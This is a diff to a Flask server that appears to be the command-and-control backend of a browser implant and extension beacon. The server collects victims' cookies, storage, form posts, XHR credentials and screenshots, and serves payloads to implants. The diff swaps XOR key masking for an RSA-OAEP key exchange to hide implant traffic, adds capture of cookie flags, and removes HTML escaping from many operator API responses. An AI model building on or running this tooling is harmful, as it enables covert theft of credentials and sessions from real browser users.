@@ -19,6 +19,9 @@ from email.mime.text import MIMEText
 from flask_executor import Executor
 from apscheduler.schedulers.background import BackgroundScheduler
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.serialization import load_der_public_key
+from cryptography.hazmat.primitives.asymmetric import padding as asymmetric_padding
+from cryptography.hazmat.primitives import hashes
 import magic
 import base64
 import json
@@ -329,9 +332,10 @@ class BeaconCapture(Base):
 
     id         = Column(Integer, primary_key=True)
     domainID   = Column(Integer, nullable=False)
-    captureType = Column(String(50), nullable=False) # header, cookie, token, storage
+    captureType = Column(String(50), nullable=False) # header, cookie, local_storage, session_storage
     name       = Column(String(255), nullable=False)
     value      = Column(Text, nullable=False)
+    extraData  = Column(Text, nullable=True)  # JSON for cookie flags, etc.
     capturedAt = Column(DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
@@ -1383,10 +1387,10 @@ def returnUUID(tag='', clientType='js-implant'):
 
 
 
-# Check if we're using traffic obfuscation
-# and if we are return IV and key
-@app.route('/client/metricSettings/<identifier>', methods=['GET'])
-def getObfuscationSettings(identifier):
+# RSA-OAEP key exchange: client sends its public key,
+# server encrypts AES keys with it and returns the ciphertext
+@app.route('/client/keyExchange/<identifier>', methods=['POST'])
+def keyExchange(identifier):
     if not isClientSessionValid(identifier):
         return "No.", 401
 
@@ -1396,7 +1400,7 @@ def getObfuscationSettings(identifier):
     encryptionData = {}
 
     if appSettings.obfuscateTraffic or (client and client.clientType == 'bex-beacon'):
-        # generate keys if they don't exist yet for this session
+        # Generate AES keys if they don't exist yet for this session
         if client.receiveKey is None or client.sendKey is None:
             receiveKey = os.urandom(32)
             sendKey    = os.urandom(32)
@@ -1410,25 +1414,29 @@ def getObfuscationSettings(identifier):
             receiveKey = client.receiveKey
             sendKey    = client.sendKey
 
-        # Get rid of dashes in UUID session identifier
-        identifierBytes = bytes.fromhex(identifier.replace('-', ''))
+        # Parse the client's RSA public key from the request
+        content = request.json
+        clientPubKeyDer = base64.b64decode(content['publicKey'])
+        clientPublicKey = load_der_public_key(clientPubKeyDer)
 
-        # rotate the UUID for some light obfuscation
-        shift        = 7 % len(identifierBytes)
-        rotatedBytes = identifierBytes[shift:] + identifierBytes[:shift]
+        # Encrypt receiveKey + sendKey (64 bytes) with RSA-OAEP
+        # Client assigns: first 32 bytes = its sendKey, next 32 = its receiveKey
+        # So: client encrypts with receiveKey (server decrypts with client.receiveKey) ✓
+        #     server encrypts with sendKey (client decrypts with client.sendKey) ✓
+        plaintextKeys = receiveKey + sendKey
+        encryptedKeys = clientPublicKey.encrypt(
+            plaintextKeys,
+            asymmetric_padding.OAEP(
+                mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
 
-        #xor up
-        plaintextData = sendKey + receiveKey
-
-        maskRepeated = (rotatedBytes * ((len(plaintextData) // len(rotatedBytes)) + 1))[:len(plaintextData)]
-        obfuscatedData = bytes(a ^ b for a, b in zip(plaintextData, maskRepeated))
-
-        encryptionData["enable"]      = "true"
-        encryptionData["metricDebug"] = base64.b64encode(obfuscatedData).decode("utf-8")
+        encryptionData["enable"]        = "true"
+        encryptionData["encryptedKeys"] = base64.b64encode(encryptedKeys).decode("utf-8")
     else:
-        encryptionData["enable"]      = "false"
-        encryptionData["metricDebug"] = ""
-
+        encryptionData["enable"] = "false"
 
     return jsonify(encryptionData)
 
@@ -1570,7 +1578,8 @@ def receiveEncryptedMessage(identifier):
         name        = jsonData.get('name')
         value       = jsonData.get('value')
         url         = jsonData.get('url') # Optional URL
-        saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url)
+        extraData   = jsonData.get('metadata') # Optional JSON metadata (cookie flags, etc.)
+        saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url, extraData)
 
     elif path.decode('utf-8').startswith("/bex/screenshot/"):
         targetUUID = path.decode('utf-8').replace("/bex/screenshot/", "")
@@ -1628,17 +1637,6 @@ def saveFingerprint(identifier, fingerprint):
     dbCommit()
 
 
-
-
-@app.route('/client/confirmCrypto/<identifier>', methods=['GET'])
-def confirmCrypto(identifier):
-    client = Client.query.filter_by(uuid=identifier).first()
-    if client:
-        client.cryptoActive = True
-        dbCommit()
-        logger.info(f"Client {identifier} confirmed crypto is active.")
-        return "ok", 200
-    return "No.", 404
 
 
 # Report the client fingerprint if setup to calculate one
@@ -2470,21 +2468,21 @@ def saveBeaconVisit(identifier, domain, url, ip, userAgent):
     dbCommit()
 
 
-def saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url=None):
+def saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url=None, extraData=None):
     # Ensure domain exists and record visit if URL is present
     saveBeaconVisit(identifier, domain, url, ip, userAgent)
-    
+
     # Fetch domain object to get its ID for the capture link
     domainObj = BeaconDomain.query.filter_by(clientID=identifier, domain=domain).first()
     if domainObj:
         # Deduplication: Check for same capture in the last 10 minutes
         lastCapture = BeaconCapture.query.filter_by(
-            domainID=domainObj.id, 
-            captureType=captureType, 
-            name=name, 
+            domainID=domainObj.id,
+            captureType=captureType,
+            name=name,
             value=value
         ).order_by(BeaconCapture.capturedAt.desc()).first()
-        
+
         shouldSave = True
         if lastCapture:
             now = datetime.datetime.now(datetime.timezone.utc)
@@ -2492,14 +2490,14 @@ def saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgen
             lastCapturedAt = lastCapture.capturedAt
             if lastCapturedAt.tzinfo is None:
                 lastCapturedAt = lastCapturedAt.replace(tzinfo=datetime.timezone.utc)
-            
+
             timeDiff = now.timestamp() - lastCapturedAt.timestamp()
             if timeDiff < 600: # 10 minutes
                 shouldSave = False
-        
+
         if shouldSave:
             # Save the capture
-            newCapture = BeaconCapture(domainID=domainObj.id, captureType=captureType, name=name, value=value)
+            newCapture = BeaconCapture(domainID=domainObj.id, captureType=captureType, name=name, value=value, extraData=extraData)
             db_session.add(newCapture)
             dbCommit()
     
@@ -2639,20 +2637,20 @@ def getClients():
                 display_domain = parsed.hostname
 
         allClients.append({
-            'id': escape(client.id), 
-            'uuid': client.uuid, 
-            'tag': escape(client.tag), 
-            'clientType': escape(client.clientType), 
-            'parentUUID': escape(client.parentUUID) if client.parentUUID else None, 
-            'domain': escape(display_domain) if display_domain else None,
-            'nickname': escape(client.nickname), 
-            'notes': escape(client.notes), 
-            'firstSeen': client.firstSeen, 
-            'lastSeen': client.lastSeen, 
-            'ip': escape(client.ipAddress),
-            'platform': escape(client.platform), 
-            'browser': escape(client.browser), 
-            'isStarred': client.isStarred, 
+            'id': client.id,
+            'uuid': client.uuid,
+            'tag': client.tag,
+            'clientType': client.clientType,
+            'parentUUID': client.parentUUID if client.parentUUID else None,
+            'domain': display_domain if display_domain else None,
+            'nickname': client.nickname,
+            'notes': client.notes,
+            'firstSeen': client.firstSeen,
+            'lastSeen': client.lastSeen,
+            'ip': client.ipAddress,
+            'platform': client.platform,
+            'browser': client.browser,
+            'isStarred': client.isStarred,
             'hasJobs': client.hasJobs,
             'fingerprint': client.fingerprint,
             'sidecarAvailable': client.sidecarAvailable
@@ -2704,7 +2702,7 @@ def getBexVisits(domainID):
 @login_required
 def getBexCaptures(domainID):
     captures = BeaconCapture.query.filter_by(domainID=domainID).all()
-    captureData = [{'id': c.id, 'type': c.captureType, 'name': c.name, 'value': c.value, 'capturedAt': c.capturedAt} for c in captures]
+    captureData = [{'id': c.id, 'type': c.captureType, 'name': c.name, 'value': c.value, 'metadata': c.extraData, 'capturedAt': c.capturedAt} for c in captures]
     return jsonify(captureData)
 
 
@@ -2717,8 +2715,8 @@ def getClientEvents(id):
 
     events = Event.query.filter_by(clientID=clientUUID)
 
-    eventData = [{'id':escape(event.id), 'timeStamp':event.timeStamp, 
-        'eventType':escape(event.eventType), 'eventID':escape(event.eventID)} for event in events]
+    eventData = [{'id':event.id, 'timeStamp':event.timeStamp,
+        'eventType':event.eventType, 'eventID':event.eventID} for event in events]
 
     return jsonify(eventData)
 
@@ -2729,7 +2727,7 @@ def getClientEvents(id):
 def getClientScreenshots(key):
     screenshot = Screenshot.query.filter_by(id=key).first()
 
-    screenshotData = {'fileName':escape(screenshot.fileName)}
+    screenshotData = {'fileName':screenshot.fileName}
     
 
     return jsonify(screenshotData)
@@ -2758,7 +2756,7 @@ def getClientHtml(key):
 def getClientUrls(key):
     urlsVisited = UrlVisited.query.filter_by(id=key).first()
 
-    urlData = {'url':escape(urlsVisited.url)}
+    urlData = {'url':urlsVisited.url}
     
 
     return jsonify(urlData)
@@ -2770,7 +2768,7 @@ def getClientUrls(key):
 def getClientUserInputs(key):
     userInput = UserInput.query.filter_by(id=key).first()
 
-    userInputData = {'inputName':escape(userInput.inputName), 'inputValue':escape(userInput.inputValue)}
+    userInputData = {'inputName':userInput.inputName, 'inputValue':userInput.inputValue}
     
 
     return jsonify(userInputData)
@@ -2783,7 +2781,7 @@ def getClientCookies(key):
     # logger.info("*** In cookie lookup, key is: " + key)
     cookie = Cookie.query.filter_by(id=key).first()
 
-    cookieData = {'cookieName':escape(cookie.cookieName), 'cookieValue':escape(cookie.cookieValue)}
+    cookieData = {'cookieName':cookie.cookieName, 'cookieValue':cookie.cookieValue}
     
 
     return jsonify(cookieData)
@@ -2799,7 +2797,7 @@ def getClientLocalStorage(key):
     localStorage = LocalStorage.query.filter_by(id=key).first()
     # logger.info("Sending back: " + localStorage.key + ":" + localStorage.value)
     
-    localStorageData = {'localStorageKey':escape(localStorage.key), 'localStorageValue':escape(localStorage.value)}
+    localStorageData = {'localStorageKey':localStorage.key, 'localStorageValue':localStorage.value}
     
 
     return jsonify(localStorageData)
@@ -2812,7 +2810,7 @@ def getClientLocalStorage(key):
 def getClientSesssionStorage(key):
     sessionStorage = SessionStorage.query.filter_by(id=key).first()
     
-    sessionStorageData = {'sessionStorageKey':escape(sessionStorage.key), 'sessionStorageValue':escape(sessionStorage.value)}
+    sessionStorageData = {'sessionStorageKey':sessionStorage.key, 'sessionStorageValue':sessionStorage.value}
     
 
     return jsonify(sessionStorageData)
@@ -2834,12 +2832,12 @@ def getClientXhrApiCall(key):
 
 
     xhrCallData = {
-        'method': escape(xhrApiCall.method),
-        'url': escape(xhrApiCall.url),
-        'asyncRequest': escape(xhrApiCall.asyncRequest),
-        'user': escape(xhrApiCall.user),
-        'password': escape(xhrApiCall.password),
-        'responseStatus': escape(xhrApiCall.responseStatus),
+        'method': xhrApiCall.method,
+        'url': xhrApiCall.url,
+        'asyncRequest': xhrApiCall.asyncRequest,
+        'user': xhrApiCall.user,
+        'password': xhrApiCall.password,
+        'responseStatus': xhrApiCall.responseStatus,
         'headers': headers_list
     }
 
@@ -2877,9 +2875,9 @@ def getClientFetchApiCall(key):
 
 
     fetchCallData = {
-        'method': escape(fetchApiCall.method),
-        'url': escape(fetchApiCall.url),
-        'responseStatus': escape(fetchApiCall.responseStatus),
+        'method': fetchApiCall.method,
+        'url': fetchApiCall.url,
+        'responseStatus': fetchApiCall.responseStatus,
         'headers': headers_list
     }
 
@@ -2903,11 +2901,13 @@ def getClientFetchCall(key):
 @app.route('/api/clientFormPosts/<key>', methods=['GET'])
 @login_required
 def getClientFormPost(key):
-    #logger.info("*** Fetching client form post..")
     formPost = FormPost.query.filter_by(id=key).first()
 
+    if not formPost:
+        return jsonify({'error': 'not found'}), 404
+
     # formAction and data are base64 encoded at this point
-    formPostData = {'name':escape(formPost.formName), 'action':formPost.formAction, 'method':escape(formPost.formMethod), 'data': formPost.formData, 'url':formPost.url}
+    formPostData = {'name':formPost.formName, 'action':formPost.formAction, 'method':formPost.formMethod, 'data': formPost.formData, 'url':formPost.url}
 
     return jsonify(formPostData)
 
@@ -2941,7 +2941,7 @@ def searchCsrfToken(key):
                     break
 
     if foundToken:
-        tokenFileData = {'url':escape(htmlCode.url), 'fileName':escape(htmlCode.fileName)}
+        tokenFileData = {'url':htmlCode.url, 'fileName':htmlCode.fileName}
     else:
         tokenFileData = {'url':'Not Found', 'fileName':'Not Found'}
 
@@ -3022,6 +3022,9 @@ def getClientCustomExfil(key):
 def getClientCustomExfilDetail(key):
     customExfil = CustomExfil.query.filter_by(id=key).first()
 
+    if not customExfil:
+        return jsonify({'error': 'not found'}), 404
+
     # Note these are base64 encoded at this point, they'll need
     # to be escaped client side
     customExfilData = {'note':customExfil.note, 'data':customExfil.data}
@@ -3049,7 +3052,7 @@ def setClientNotes(key):
 @login_required
 def getAllClientNotes():
     clients = Client.query.all()
-    allNoteData = [{'client':str(escape(client.nickname)), 'note':client.notes} for client in clients]
+    allNoteData = [{'client':client.nickname, 'note':client.notes} for client in clients]
 
     return jsonify(allNoteData)
 
@@ -3163,7 +3166,7 @@ def getShowFingerprint():
 def getEmailSettings():
     appSettings = AppSettings.query.filter_by(id=1).first()
 
-    emailData = {'emailServer':escape(appSettings.emailServer), 'username':escape(appSettings.emailUsername), 'password':'*********', 'eventType': escape(appSettings.emailEventType), 'delay': escape(appSettings.emailDelay)}
+    emailData = {'emailServer':appSettings.emailServer, 'username':appSettings.emailUsername, 'password':'*********', 'eventType': appSettings.emailEventType, 'delay': appSettings.emailDelay}
 
     return jsonify(emailData)
 
@@ -3229,7 +3232,7 @@ def getEmailNotifications():
 def getTargetEmails():
     targetEmails = NotificationEmail.query.all()
 
-    allEmails = [{'id':escape(targetEmail.id), 'address':escape(targetEmail.emailAddress)} for targetEmail in targetEmails]
+    allEmails = [{'id':targetEmail.id, 'address':targetEmail.emailAddress} for targetEmail in targetEmails]
 
     return jsonify(allEmails)
  
@@ -3316,7 +3319,7 @@ def blockClientSession(key):
 def getBlockedIPs():
     blockedIPs = BlockedIP.query.all()
 
-    allBlockedIPs = [{'id':escape(blockedIP.id), 'ip':escape(blockedIP.ip)} for blockedIP in blockedIPs]
+    allBlockedIPs = [{'id':blockedIP.id, 'ip':blockedIP.ip} for blockedIP in blockedIPs]
 
     return jsonify(allBlockedIPs)
 
@@ -3353,7 +3356,7 @@ def deleteBlockedIP(key):
 def getSavedCustomPayloads():
     savedPayloads = CustomPayload.query.all()
 
-    allSavedPayloads = [{'id':escape(payload.id), 'name':escape(payload.name), 'autorun':payload.autorun, 'repeatrun':payload.repeatrun} for payload in savedPayloads]
+    allSavedPayloads = [{'id':payload.id, 'name':payload.name, 'autorun':payload.autorun, 'repeatrun':payload.repeatrun} for payload in savedPayloads]
 
     return jsonify(allSavedPayloads)
 
@@ -3380,8 +3383,8 @@ def getPayloadsForClient(key):
                 break
 
         payloadData = {
-            'id':escape(payload.id),
-            'name':escape(payload.name),
+            'id':payload.id,
+            'name':payload.name,
             'autorun':payload.autorun,
             'repeatrun':repeatRunFound
         }
@@ -3400,7 +3403,7 @@ def getPayloadsForClient(key):
 def getSavedPayloadCode(key):
     payload = CustomPayload.query.filter_by(id=key).first()
 
-    payloadData = {'name':escape(payload.name), 'description':escape(payload.description),'code':escape(payload.code)}
+    payloadData = {'name':payload.name, 'description':payload.description, 'code':payload.code}
 
     return jsonify(payloadData)
 
